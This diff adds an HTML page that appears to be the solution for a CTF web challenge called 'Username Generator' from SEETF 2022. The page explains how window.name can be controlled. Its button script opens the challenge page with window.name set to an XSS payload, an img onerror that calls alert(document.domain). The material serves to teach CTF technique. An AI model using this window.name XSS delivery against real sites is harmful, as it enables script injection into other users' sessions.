@@ -1,0 +1,52 @@
+<html>
+
+<head>
+  <style>
+    nav span {
+      padding-right: 10px;
+    }
+
+    body {
+      font-family: system, -apple-system, "San Francisco", "Roboto", "Segoe UI", "Helvetica Neue", "Helvetica", "Lucida Grande", "Arial", sans-serif;
+      padding: 0 10px;
+      line-height: 1.4;
+      font-size: 16px;
+      color: #111;
+    }
+
+    h1,
+    h2,
+    h3 {
+      line-height: 1.0;
+    }
+  </style>
+</head>
+
+<body style="margin: auto; max-width: 650px">
+  <div style="margin-top: 30px; height: 40px">
+    <h1 style="float: left; margin: 0; padding-right: 10px">Username Generator Solution</h1>
+  </div>
+  <hr>
+  <p>
+    In HTML, the JavaScript global scope is the <code>window</code> object.
+    We can control <code>window.name</code> using <code>window.open</code> or the <code>name</code> attribute of an
+    <code>iframe</code>.
+  </p>
+  <p>
+    <a href="https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2022/web/username-generator/solve/solve.md"
+      target="_blank">Full Solution</a>
+    | <a href="/">Home</a>
+  </p>
+
+  <button onclick="exploit()">Run Expoit</button>
+  <script>
+    const exploit = () => {
+      window.open(
+        '/username-generator/?length=',
+        '<img src=x onerror="alert(document.domain)"/>'
+      )
+    }
+  </script>
+</body>
+
+</html>
